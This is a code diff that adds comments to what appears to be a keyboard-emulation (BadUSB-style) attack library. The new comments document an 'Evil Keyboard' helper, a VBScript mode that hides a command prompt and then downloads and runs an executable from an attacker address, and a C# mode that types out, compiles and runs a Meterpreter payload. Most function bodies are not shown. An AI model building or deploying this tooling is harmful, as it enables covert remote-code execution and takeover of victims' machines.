@@ -390,6 +390,14 @@ void reset_scrolllock(bool old_status)
     press_scrolllock();
 }
 
+// This function checks the state of the numlock key on an interval for a change in the state.
+//
+// @reps [int] Number of times to check the state of the key for changes.
+// @millisecs [int] Time to wait between checks
+//
+// @return [true] A change in status was identified during the checking.
+// @return [false] No change was detected during the checking.
+
 bool numlock_success(int reps, int millisecs)
 {
   bool curr_status = is_num_on();
@@ -410,6 +418,14 @@ bool numlock_success(int reps, int millisecs)
   reset_numlock(curr_status);
   return false;
 }
+
+// This function checks the state of the caps lock key on an interval for a change in the state.
+//
+// @reps [int] Number of times to check the state of the key for changes.
+// @millisecs [int] Time to wait between checks
+//
+// @return [true] A change in status was identified during the checking.
+// @return [false] No change was detected during the checking.
 
 bool capslock_success(int reps, int millisecs)
 {
@@ -432,8 +448,15 @@ bool capslock_success(int reps, int millisecs)
   return false;
 }
 
-// This function will check on a regular interval for the capslock status to change. If it changes it will return false. If it doesn't it will return true.
-// This is for the Evil Keyboard program
+// This function will check on a regular interval for the capslock status to change.
+// This is for the Evil Keyboard program - See that program to explain why this logic is backwards from normal.
+//
+// @reps [int] Number of times to check the state of the key for changes.
+// @millisecs [int] Time to wait between checks
+//
+// @return [true] Capslock status did not change
+// @return [false] Capslock status did change
+
 bool capslock_check(int reps, int millisecs)
 {
   int i = 0;
@@ -450,6 +473,14 @@ bool capslock_check(int reps, int millisecs)
   while (is_caps_on() && (i < reps));
   return true;
 }
+
+// This function checks the state of the scroll lock key on an interval for a change in the state.
+//
+// @reps [int] Number of times to check the state of the key for changes.
+// @millisecs [int] Time to wait between checks
+//
+// @return [true] A change in status was identified during the checking.
+// @return [false] No change was detected during the checking.
 
 bool scrolllock_success(int reps, int millisecs)
 {
@@ -472,7 +503,14 @@ bool scrolllock_success(int reps, int millisecs)
   return false;
 }
 
-// These functions will type out strings using the ASCII numberset
+// ------------------------------------------------------------------------------------------------------------------------------
+// These functions will type out strings using the ASCII numberset. This is a slower way of typing that can come in handy.
+
+// This function prints a line by typing out each char using its ASCII code.
+//
+// @string [string] Line to be typed out.
+//
+// @return [void] A useful return value is not expected here
 
 void ascii_println(char string[])
 {
@@ -484,6 +522,12 @@ void ascii_println(char string[])
   delay(100);
 }
 
+// This function types a string by typing out each char using its ASCII code.
+//
+// @string [string] string to be typed out.
+//
+// @return [void] A useful return value is not expected here
+
 void ascii_type_this(char string[])
 {
   int count, length;
@@ -494,6 +538,12 @@ void ascii_type_this(char string[])
     ascii_input(ascii_convert(a));
   }
 }
+
+// This function types each character using the char's ASCII code (Alt + Code)
+//
+// @string [string] The string of numbers to be pressed to type out a specific ASCII char.
+//
+// @return [void] A useful return value is not expected here
 
 void ascii_input(char string[])
 {
@@ -522,6 +572,13 @@ void ascii_input(char string[])
   }
   clear_key();
 }
+
+// This function converts a char to its ASCII code.
+//
+// @string [string] char to be converted to ASCII.
+//
+// @return [string] returns a string of numbers representing the input char's ASCII code.
+// @return "000" if not found in the list
 
 char* ascii_convert(char string)
 {
@@ -625,9 +682,21 @@ char* ascii_convert(char string)
   return "000";
 }
 
-// These functions define the vbscript attack mode.
+// ---------------------------------------------------------------------------------------------------------------------------------------
+// These functions define the VBScript attack mode.
+// This mode types out a VBScript that will download and execute a file.
 
+// !!! NOTE: This will leave the executable on the target computer in the user's home directory. You will need to delete it after migration!!!
+
+// set a standard delay between commands.
 int cmd_break = 75;
+
+// This function opens a command prompt, hides it, and types out the VBScript
+//
+// @address [string] IPv4 address and port number for the download ie "http://192.168.1.101:12056/"
+// @filename [string] file to be downloaded ie "t.exe"
+//
+// @return [void] A useful return value is not expected here
 
 void vbscript_run_and_hide(char address[], char filename[])
 {
@@ -635,6 +704,13 @@ void vbscript_run_and_hide(char address[], char filename[])
   hide_window();
   vbscript_download_and_run(address, filename);
 }
+
+// This function types out the VBScript, executes it, and then deletes it.
+//
+// @address [string] IPv4 address and port number for the download ie "http://192.168.1.101:12056/"
+// @filename [string] file to be downloaded ie "t.exe"
+//
+// @return [void] A useful return value is not expected here
 
 void vbscript_download_and_run(char address[], char filename[])
 {
@@ -694,7 +770,19 @@ void vbscript_download_and_run(char address[], char filename[])
   Keyboard.println("exit");    
 }
 
-// These function are for the C# attack method
+// ---------------------------------------------------------------------------------------------------------------------------------------------
+// These function are for the C# attack method.
+// This method types out a C# application that executes a Meterpreter Payload.
+// Once typed out, this method uses the native .NET compiler to compile the code, it is then executed.
+
+// !!! NOTE: This will leave a file "t.exe" on the target machine in the user's home directory. You will need to delete this after migration!!!
+
+// This function opens a command prompt, hides it, and types out the C# program and executes it.
+//
+// @payload [string] The hex of the Meterpreter payload (Use Metasploit module /exploit/hex_generator to get this code.)
+// @net_ver [char] The current .NET version - probably '4'
+//
+// @return [void] A useful return value is not expected here
 
 void cs_run_and_hide(char payload[], char net_ver[])
 {
@@ -702,6 +790,13 @@ void cs_run_and_hide(char payload[], char net_ver[])
   hide_window();
   cs_write_compile_run(payload, net_ver);
 }
+
+// This function types out the C# program and executes it.
+//
+// @payload [string] The hex of the Meterpreter payload (Use Metasploit module /exploit/hex_generator to get this code.)
+// @net_ver [char] The current .NET version - probably '4'
+//
+// @return [void] A useful return value is not expected here
 
 void cs_write_compile_run(char payload[], char net_ver[])
 {
